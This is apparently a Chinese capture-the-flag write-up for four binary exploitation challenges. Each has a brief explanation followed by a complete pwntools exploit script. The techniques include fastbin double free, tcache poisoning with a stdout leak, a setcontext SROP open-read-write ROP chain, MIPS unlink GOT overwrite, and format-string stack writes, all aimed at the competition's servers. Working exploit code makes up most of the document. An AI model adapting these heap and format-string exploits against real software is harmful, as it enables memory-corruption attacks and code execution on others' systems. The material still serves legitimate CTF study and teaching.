### pwn1
因为是UAF的洞,所以可以double free,然后又给了我们一个stack地址,所以先case 3在栈上布置一个fake chunk header,再利用fastbin attack将块申请过去,因为可以一直覆盖,而read函数又不会末尾补0,因而printf("%s"),会把libc_start_main_ret带出来,得到libc_base就打malloc_hook,realloc修一下栈,本地和远程还有点不同,修栈也有点问题
```python
from pwn import*
def menu(ch):
	p.sendlineafter('choise:',str(ch))
p = process('./main')
p = remote('183.129.189.61',56304)
libc =ELF('./libc-2.23.so')
p.sendafter("name:",(p64(0) + p64(0x31))*6)
p.recvuntil('tag: ')
stack = int(p.recv(14),16)
log.info("Stack:\t" + hex(stack))


###########
def new(idx,content):
	menu(1)
	p.sendlineafter('your id:',str(idx))
	p.sendafter('content',content)
def free(idx):
	menu(2)
	p.sendlineafter('your id:',str(idx))
def W(content):
	menu(3)
	p.send(content)

p.sendlineafter('choice:',"2")

W(p64(0) + p64(0x71) + p64(0)*2)
new(1,"AAAA")
new(2,"AAAA")
free(2)
free(1)
free(2)
new(3,p64(stack - 0x40))
new(4,"AAAA")
new(5,"AAAA")
new(6,"A"*0x44 + 'MMMM')
W("F"*0x20)
p.recvuntil("MMMM")
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 240 - libc.sym['__libc_start_main']
log.info("LIBC:\t"+ hex(libc_base))
free(2)
free(1)
free(2)

rce = libc_base + 0x4527A
realloc = libc_base + libc.sym['realloc']
malloc_hook = libc_base + libc.sym['__malloc_hook']
new(7,p64(malloc_hook - 0x23))
new(8,"UUUU")
new(9,'UUUU')
new(10,'\x00'*(0x13 - 8) + p64(rce) + p64(realloc + 4))
free(1)
free(1)
p.interactive()
```

### pwn2
模拟了一个POST传参,其实并不难,只是一个菜单堆,可以通过测试几次就把交互模板写出来
因为又是UAF漏洞,首先放一个块进入unsorted bin中,然后tcache posion申请过去将块的fd的libc地址最后两个字节修改成IO_2_1_stdout,再用另外一个0x20的块申请过去,即可利用stdout结构leak出libc,最后则是利用free_hook,用setcontext+53制造一个SROP,将srop结构布置到堆上,释放这个块就能执行orw了
```python
from pwn import*
context.arch = 'AMD64'
def new(content):
	p.sendline("POST /create Cookie: user=admin token: \x34\r\n\r\ncontent=" + content)
	sleep(0.05)
def free(idx):
	p.sendline("POST /del Cookie: user=admin token: \x34\r\n\r\nindex=" + str(idx))
	sleep(0.05)
def edit(idx,content):
	p.sendline("POST /edit Cookie: user=admin token: \x34\r\n\r\nindex=" +str(idx) +  "&content="+ content)
	sleep(0.05)
while True:
	p = process('./main')
	p = remote('183.129.189.61',53702)
	libc =ELF('./libc-2.27.so')
	try:
		new("A"*0x80)
		new("A"*0x20 + '\x00')
		new("A"*0x10 + '\x00')
		new("A"*0x100)
		p.recvuntil("Your gift: ")
		heap_base = int(p.recvuntil('"}',drop=True),16) - 0x260
		log.info('HEAP:\t' + hex(heap_base))

		for i in range(8):
			free(0)
		free(2)
		free(2)
		free(2)
		new(p64(heap_base + 0x260))
		new(p64(heap_base + 0x260))
		new('\x60\x47')

		free(1)
		free(1)
		new("A"*0x20)
		edit(7,p64(heap_base + 0x260))
		new("A"*0x20)
		new("A"*0x20)
		new("A"*0x28)
		edit(10,p64(0xFBAD1800) + p64(0)*3 + '\xC8')
		libc_base = u64(p.recvuntil('\x7F',timeout=0.3)[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
		log.info('LIBC:\t' + hex(libc_base))
		free_hook = libc_base + libc.sym['__free_hook']
		system = libc_base + libc.sym['system']
		setcontext = libc_base + libc.sym['setcontext'] + 53
		rce = libc_base + 0x4F3C2
		free(2)
		free(2)
		new(p64(free_hook))
		new("UUUU")
		new(p64(setcontext))
		ret = libc_base  + 0x00000000000008AA

		Open = libc_base + libc.symbols["open"]
		Read = libc_base + libc.symbols["read"]
		Puts = libc_base + libc.symbols['puts']
		pop_rdi_ret = libc_base + 0x000000000002155F
		pop_rsi_ret = libc_base + 0x0000000000023E8A
		pop_rdx_ret = libc_base + 0x0000000000001B96
		orw  = ''
		orw += p64(pop_rdi_ret)+p64(heap_base + 0x3B8)
		orw += p64(pop_rsi_ret)+p64(0)
		orw += p64(Open)
		orw += p64(pop_rdi_ret) + p64(4)
		orw += p64(pop_rdx_ret) + p64(0x30)
		orw += p64(pop_rsi_ret) + p64(heap_base)
		orw += p64(Read)
		orw += p64(pop_rdi_ret)+p64(heap_base)
		orw += p64(Puts)
		orw += './flag\x00'
		frame = SigreturnFrame()
		frame.rax = 0
		frame.rdi = 0
		frame.rsi = 0
		frame.rdx = 0
		frame.rsp = heap_base + 0x250 + 0x90 + 0x30 + 0x20 + 0x10
		frame.rip = ret
		payload = orw + str(frame)[len(orw):]
		edit(3,payload)
		free(3)
		break
	except:
		p.close()
		continue
p.interactive()
```

### pwn3
简单mips,和glibc的unlink任意写做法一样
```python
from pwn import*
def menu(ch):
	p.sendlineafter("options >>",str(ch))
def new(size,content):
	menu(1)
	p.sendlineafter('length:',str(size))
	p.sendafter('info:',content)
def free(index):
	menu(2)
	p.sendlineafter('user:',str(index))
def edit(index,content):
	menu(3)
	p.sendlineafter("edit:",str(index))
	p.sendafter('info:',content)
def show(index):
	menu(4)
	p.sendlineafter("show:",str(index))
p = process('./run.sh',shell=True)
p = remote('183.129.189.62',58603)
free_got = 0x4117B4
note_list = 0x411830
new(0x80,"UUUU")
new(0x88,"UUUU")
new(0x20,"cat flag\n")
edit(0,p32(0) + p32(0x81) + p32(note_list -12) + p32(note_list -8) + '\x00'*0x70 + p32(0x80) + p32(0x90))
free(1)
edit(0,p64(0) + p32(free_got) + p32(4))
show(0)
p.recvuntil('info: ')
libc_base = u32(p.recv(4)) - 0x56B68
log.info('LIBC:\t' + hex(libc_base))
system = libc_base + 0x5F8F0
edit(0,p32(system))
free(2)
p.interactive()
```

### pwn5
思路和国赛第二天的fmt差不多,主要是利用si进入pritnf函数中,会push一个返回地址进去,这里如果利用printf中的实现函数,格式化字符串漏洞将这个返回地址改成start函数,就能抬栈,然后栈上留下_IO_2_1_stdout_的指针,然后通过栈链将这个地址改到fileno位置,修改stdout结构体中的fileno为2,之后则是拿到libc往malloc_hook中写og,再用printf触发调用malloc_hook
```python
from pwn import*
#context.log_level = 'DEBUG'
while True:
	p = process('./main',timeout=0.5)
#	p = remote('183.129.189.62',61405)
	elf =ELF('./main')
	libc =ELF('./libc-2.23.so')

	try:
		p.recvuntil('gift : ')
		stack = int(p.recv(14),16)

		if stack&0xFFFF > 0x2000:
			p.close
			continue
		log.info('Stack:\t' + hex(stack))
		p.sendline('\x00'*0x50 + './flag\n')
		p.sendline('%' + str((stack  -0xC)&0xFFFF) + 'c%11$hn')
		p.sendline('%1968c%37$hn')
		sleep(0.02)
		def w(off,byte):
			if ord(byte):
				p.sendline('%' + str((stack + off)&0xFFFF) + 'c%10$hn')
				p.sendline('%' + str(ord(byte)) + 'c%36$hhn')
			else:
				p.sendline('%' + str((stack + off)&0xFFFF) + 'c%10$hn')
				p.sendline('%36$hn')
			sleep(0.05)
#		gdb.attach(p,"set *(size_t*)0x7fffffffdf18=0x5555555547B0")
		w(-0x54,'\x90')
		p.sendline('%2c%26$n')
		
		p.sendline('LIBC:%9$pPIE:%8$p\x00')
		p.recvuntil('LIBC:')
		libc_base = int(p.recv(14),16) - 240 -libc.sym['__libc_start_main']
		log.info('LIBC:\t' + hex(libc_base))
		
		p.recvuntil('PIE:')
		proc_base = int(p.recv(14,timeout=0.5),16) -0x990
		log.info('Proc:\t' +hex(proc_base))
		
		pop_rdi_ret = libc_base + 0x0000000000021112
		pop_rsi_ret = libc_base + 0x00000000000202F8
		pop_rdx_ret = libc_base + 0x0000000000001B92
		Open = libc_base + libc.sym['open']
		Read = libc_base + libc.sym['read']
		Puts = libc_base + libc.sym['puts']
		
		ORW  = p64(pop_rdi_ret) + p64(proc_base + 0x201040 + 0x50) + p64(pop_rsi_ret) + p64(0) + p64(Open)
		ORW += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(proc_base + elf.bss() + 0x100) + p64(pop_rdx_ret) + p64(0x30) + p64(Read)
		ORW += p64(pop_rdi_ret) + p64(proc_base + elf.bss() + 0x100) + p64(Puts)
		#for i in range(len(ORW)):
		#	w(-0xDC + i,ORW[i])
		mhook = p64(libc_base + libc.sym['__malloc_hook'])
		rce = p64(libc_base + 0xF1207)
		for i in range(3,-1,-1):
			w(-0xDC + i,mhook[i])
		sleep(3)
		for i in range(4):
			w(-0xDC,chr(ord(mhook[0]) + i))
			p.sendline('%' + str(ord(rce[i])) + 'c%9$hhn')
			sleep(0.05)
		p.sendline('%99999c%10$n')
		break
	except:
		p.close()
		continue
os.system("rm core")
p.interactive()
```
